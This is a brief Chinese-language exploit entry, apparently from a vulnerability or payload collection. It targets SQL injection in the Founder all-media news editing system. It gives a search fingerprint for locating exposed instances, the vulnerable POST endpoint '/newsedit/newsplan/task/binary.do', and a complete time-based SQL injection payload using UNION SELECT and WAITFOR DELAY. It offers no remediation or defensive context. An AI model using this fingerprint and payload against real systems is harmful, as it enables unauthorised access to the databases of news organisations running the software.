# 方正全媒体新闻采编系统-SQL注入-binary

方正全媒体新闻采编系统 ｜ SQL注入 ｜ —
- **指纹**：`body="/newsedit/newsedit/"`
- **请求**：`POST /newsedit/newsplan/task/binary.do HTTP/1.1`

**Payload**
```
TableName=DOM_IMAGE+where+REFID%3D-1+union+select+%271%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27%3Bselect+DOM_IMAGE+from+IMG_LARGE_PATH&FieldName=IMG_LARGE_PATH&KeyName=REFID&KeyID=1
```
- **响应特征**：999